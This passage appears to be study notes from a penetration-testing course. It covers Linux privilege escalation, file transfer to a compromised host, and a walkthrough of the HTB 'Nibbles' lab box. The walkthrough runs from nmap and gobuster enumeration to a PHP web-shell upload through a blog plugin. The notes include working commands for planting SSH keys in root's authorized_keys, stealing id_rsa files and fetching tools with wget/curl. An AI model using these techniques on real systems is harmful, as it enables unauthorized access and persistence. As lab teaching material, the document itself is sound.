The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with -u user:

```
sudo -u user /bin/echo Hello World!

    Hello World!
```

Once we find a particular application we can run with sudo, we can look for ways to exploit it to get a shell as the root user. GTFOBins contains a list of commands and how they can be exploited through sudo. We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the sudo privilege we have.

LOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

https://gtfobins.github.io/

https://lolbas-project.github.io/#

In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

    Add new scheduled tasks/cron jobs
    Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:

    /etc/crontab
    /etc/cron.d
    /var/spool/cron/crontabs/root

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:

```
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

As we can see, the database password 'password123' is exposed, which would allow us to log in to the local mysql databases and look for interesting information. We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows:

```
su -

Password: password123
whoami

root
```

We may also use the user credentials to ssh into the server as that user.
SSH Keys

Finally, let us discuss SSH keys. If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:

```
vim id_rsa
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#
```
Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.

If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:

```
ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:

`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`

Now, the remote server should allow us to log in as that user by using our private key:

`ssh root@10.10.10.10 -i key`

As we can see, we can now ssh in as the user root. The Linux Privilege Escalation and the Windows Privilege Escalation modules go into more details on how to use each of these methods for Privilege Escalation, and many others as well.

--------------------

The questions in this section are:
SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'. 

```
sudo -l
Matching Defaults entries for user1 on ng-1101645-gettingstartedprivesc-dty5q-84c85699dc-jdd6s:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-1101645-gettingstartedprivesc-dty5q-84c85699dc-jdd6s:
    (user2 : user2) NOPASSWD: /bin/bash


Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'. 
```

sudo -u user2 /bin/bash

Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'. 

This was just copying the id_rsa file from the root directory

# Transferring Files

During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

```
cd /tmp
python3 -m http.server 8000
```


Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:


```
wget http://10.10.14.1:8000/linenum.sh
```

Note that we used our IP 10.10.14.1 and the port our Python server runs on 8000. If the remote server does not have wget, we can use cURL to download the file:

`curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`

Note that we used the -o flag to specify the output file name.


Another method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

```
scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Note that we specified the local file name after scp, and the remote directory will be saved to after the :.

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:

```
base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:

```
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

To validate the format of a file, we can run the file command on it:

```
file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it:

```
md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Now, we can go to the remote server and run the same command on the file we transferred:

```
md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

As we can see, both files have the same md5 hash, meaning the file was transferred correctly. There are various other methods for transferring files. You can check out the File Transfers module for a more detailed study on transferring files.

# Nibbles - Enumeration

There are 201 standalone boxes of various operating systems and difficulty levels available to us on the HTB platform with VIP membership when writing this. This membership includes an official HTB created walkthrough for each retired machine. We can also find blog and video walkthroughs for most boxes with a quick Google search.

For our purposes, let us walk through the box Nibbles, an easy-rated Linux box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges.

Let us first look at some machine statistics:
Machine Name 	Nibbles
Creator 	mrb3n
Operating System 	Linux
Difficulty 	Easy
User Path 	Web
Privilege Escalation 	World-writable File / Sudoers Misconfiguration
Ippsec Video 	https://www.youtube.com/watch?v=s_0GcRGv6Ds
Walkthrough 	https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html

Our first step when approaching any machine is to perform some basic enumeration. First, let us start with what we do know about the target. We already know the target's IP address, that it is Linux, and has a web-related attack vector. We call this a grey-box approach because we have some information about the target. On the HTB platform, the 20 "active" weekly-release machines are all approached from a black-box perspective. Users are given the IP address and operating system type beforehand but no additional information about the target to formulate their attacks. This is why the thorough enumeration is critical and is often an iterative process.

Before we continue, let us take a quick step back and look at the various approaches to penetration testing actions. There are three main types, black-box, grey-box, and white-box, and each differs in the goal and approach.

Engagement 	Description
Black-Box 	Low level to no knowledge of a target. The penetration tester must perform in-depth reconnaissance to learn about the target. This may be an external penetration test where the tester is given only the company name and no further information such as target IP addresses, or an internal penetration test where the tester either has to bypass controls to gain initial access to the network or can connect to the internal network but has no information about internal networks/hosts. This type of penetration test most simulates an actual attack but is not as comprehensive as other assessment types and could leave misconfigurations/vulnerabilities undiscovered.
Grey-Box 	In a grey-box test, the tester is given a certain amount of information in advance. This may be a list of in-scope IP addresses/ranges, low-level credentials to a web application or Active Directory, or some application/network diagrams. This type of penetration test can simulate a malicious insider or see what an attacker can do with a low level of access. In this scenario, the tester will typically spend less time on reconnaissance and more time looking for misconfigurations and attempting exploitation.
White-Box 	In this type of test, the tester is given complete access. In a web application test, they may be provided with administrator-level credentials, access to the source code, build diagrams, etc., to look for logic vulnerabilities and other difficult-to-discover flaws. In a network test, they may be given administrator-level credentials to dig into Active Directory or other systems for misconfigurations that may otherwise be missed. This assessment type is highly comprehensive as the tester will have access to both sides of a target and perform a comprehensive analysis.

Let us begin with a quick nmap scan to look for open ports using the command nmap -sV --open -oA nibbles_initial_scan <ip address>. This will run a service enumeration (-sV) scan against the default top 1,000 ports and only return open ports (--open). We can check which ports nmap scans for a given scan type by running a scan with no target specified, using the command nmap -v -oG -. Here we will output the greppable format to stdout with -oG - and -v for verbose output. Since no target is specified, the scan will fail but will show the ports scanned.

```
nmap -v -oG -

# Nmap 7.80 scan initiated Wed Dec 16 23:22:26 2020 as: nmap -v -oG -

# Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389) UDP(0;) SCTP(0;) PROTOCOLS(0;)

WARNING: No targets were specified, so 0 hosts scanned.

# Nmap done at Wed Dec 16 23:22:26 2020 -- 0 IP addresses (0 hosts up) scanned in 0.04 seconds
```

Finally, we will output all scan formats using -oA. This includes XML output, greppable output, and text output that may be useful to us later. It is essential to get in the habit of taking extensive notes and saving all console output early on. The better we get at this while practicing, the more second nature it will become when on real-world engagements. Proper notetaking is critical for us as penetration testers and will significantly speed up the reporting process and ensure no evidence is lost. It is also essential to keep detailed time-stamped logs of scanning and exploitation attempts in an outage or incident in which the client needs information about our activities.


```
nmap -sV --open -oA nibbles_initial_scan 10.129.42.190

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:18 EST

Nmap scan report for 10.129.42.190
Host is up (0.11s latency).
Not shown: 991 closed ports, 7 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

From the initial scan output, we can see that the host is likely Ubuntu Linux and exposes an Apache web server on port 80 and an OpenSSH server on port 22. SSH, or Secure Shell, is a protocol typically used for remote access to Linux/Unix hosts. SSH can also be used to access Windows host and is now native to Windows 10 since version 1809. We can also see that all three types of scan output were created in our working directory.


ls

nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml

Before we start poking around at the open ports, we can run a full TCP port scan using the command `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190.` This will check for any services running on non-standard ports that our initial scan may have missed. Since this scans all 65,535 TCP ports, it can take a long time to finish depending on the network. We can leave this running in the background and move on with our enumeration. Using nc to do some banner grabbing confirms what nmap told us; the target is running an Apache web server and an OpenSSH server.


```
nc -nv 10.129.42.190 22

(UNKNOWN) [10.129.42.190] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

nc tells us that port 80 runs an HTTP (web) server but does not show the banner.

```
nc -nv 10.129.42.190 80

(UNKNOWN) [10.129.42.190] 80 (http) open
```

Checking our other terminal window, we can see that the full port scan (-p-) has finished and has not found any additional ports. Let's do perform an nmap script scan using the -sC flag. This flag uses the default scripts, which are listed here. These scripts can be intrusive, so it is always important to understand exactly how our tools work. We run the command nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190. Since we already know which ports are open, we can save time and limit unnecessary scanner traffic by specifying the target ports with -p.

```
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:39 EST
Nmap scan report for 10.129.42.190
Host is up (0.11s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds
```

The script scan did not give us anything handy. Let us round out our nmap enumeration using the http-enum script, which can be used to enumerate common web application directories. This scan also did not uncover anything useful.

```
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 

Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
Nmap scan report for 10.129.42.190
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
|_http-server-header: Apache/<REDACTED> (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
```

------------------
Question in this section:
Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX) 

`nmap -sV -sC -Pn 10.129.10.160`

We can use whatweb to try to identify the web application in use.

```
whatweb 10.129.42.190

http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
```

This tool does not identify any standard web technologies in use. Browsing to the target in Firefox shows us a simple "Hello world!" message.

Checking the page source reveals an interesting comment.

```
curl http://10.129.42.190

<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

The HTML comment mentions a directory named nibbleblog. Let us check this with whatweb.

```
whatweb http://10.129.42.190/nibbleblog

http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

```

Now we are starting to get a better picture of things. We can see some of the technologies in use such as HTML5, jQuery, and PHP. We can also see that the site is running Nibbleblog, which is a free blogging engine built using PHP.

Browsing to the /nibbleblog directory in Firefox, we do not see anything exciting on the main page.

image

A quick Google search for "nibbleblog exploit" yields this Nibblblog File Upload Vulnerability. The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The Metasploit module in question works for version 4.0.3. We do not know the exact version of Nibbleblog in use yet, but it is a good bet that it is vulnerable to this. If we look at the source code of the Metasploit module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at /admin.php.

Let us use Gobuster to be thorough and check for any other accessible pages/directories.

```
gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================

Gobuster v3.0.1

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================

[+] Url:            http://10.129.42.190/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 00:10:47 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
===============================================================
2020/12/17 00:11:38 Finished
===============================================================
```

Gobuster finishes very quickly and confirms the presence of the admin.php page. We can check the README page for interesting information, such as the version number.

```
curl http://10.129.42.190/nibbleblog/README

====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====

* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====

* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP
```

So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the Metasploit module (though this could be an old README page). Nothing else interesting pops out at us. Let us check out the admin portal login page.

Now, to use the exploit mentioned above, we will need valid admin credentials. We can try some authorization bypass techniques and common credential pairs manually, such as admin:admin and admin:password, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message Nibbleblog security error - Blacklist protection.

Let us go back to our directory brute-forcing results. The 200 status codes show pages/directories that are directly accessible. The 403 status codes in the output indicate that access to these resources is forbidden. Finally, the 301 is a permanent redirect. Let us explore each of these. Browsing to nibbleblog/themes/. We can see that directory listing is enabled on the web application. Maybe we can find something interesting while poking around?

Browsing to nibbleblog/content shows some interesting subdirectories public, private, and tmp. Digging around for a while, we find a users.xml file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with cURL and prettify the XML output using xmllint.

```
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.2">
    <date type="integer">1608182171</date>
    <fail_count type="integer">5</fail_count>
  </blacklist>
</users>
```

At this point, we have a valid username but no password. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, have the following pieces of the puzzle:

    A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability

    An admin portal at nibbleblog/admin.php

    Directory listing which confirmed that admin is a valid username

    Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as Hydra off the table


There are no other ports open, and we did not find any other directories. Which we can confirm by performing additional directory brute-forcing against the root of the web application

```
gobuster dir -u http://10.129.42.190/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.42.190/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 00:36:55 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/12/17 00:37:46 Finished
===============================================================
```
Taking another look through all of the exposed directories, we find a config.xml file.

```
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -

<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.129.42.190/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>
```

Checking it, hoping for passwords proofs fruitless, but we do see two mentions of nibbles in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?

When performing password cracking offline with a tool such as Hashcat or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as CeWL.

This shows us how crucial thorough enumeration is. Let us recap what we have found so far:

    We started with a simple nmap scan showing two open ports

    Discovered an instance of Nibbleblog

    Analyzed the technologies in use using whatweb

    Found the admin login portal page at admin.php

    Discovered that directory listing is enabled and browsed several directories

    Confirmed that admin was the valid username

    Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts

    Uncovered clues that led us to a valid admin password of nibbles

This proves that we need a clear, repeatable process that we will use time and time again, no matter if we are attacking a single box on HTB, performing a web application penetration test for a client, or attacking a large Active Directory environment. Keep in mind that iterative enumeration, along with detailed notetaking, is one of the keys to success in this field. As you progress in your career, you will often marvel at how the initial scope of a penetration test seemed extremely small and "boring," yet once you dig in and perform rounds and rounds of enumeration and peel back the layers, you may find an exposed service on a high port or some forgotten page or directory that can lead to sensitive data exposure or even a foothold.

Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. We know a Metasploit module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:

Publish 	making a new post, video post, quote post, or new page. It could be interesting.
Comments 	shows no published comments
Manage 	Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting.
Settings 	Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us.
Themes 	This Allows us to install a new theme from a pre-selected list.
Plugins 	Allows us to configure, install, or uninstall plugins. The My image plugin allows us to upload an image file. Could this be abused to upload PHP code potentially?

Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.

Let us attempt to use this plugin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution.

``` php
<?php system('id'); ?>
```

Save this code to a file and then click on the Browse button and upload it.

We get a bunch of errors, but it seems like the file may have uploaded.

```
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80

```

Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the /content directory. Under this, there is a plugins directory and another subdirectory for my_image. The full path is at http://<host>/nibbleblog/content/private/plugins/my_image/. In this directory, we see two files, db.xml and image.php, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.

```
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the nibbler user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.

Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are PayloadAllTheThings and HighOn,Coffee.

Let us use the following Bash reverse shell one-liner and add it to our PHP script.
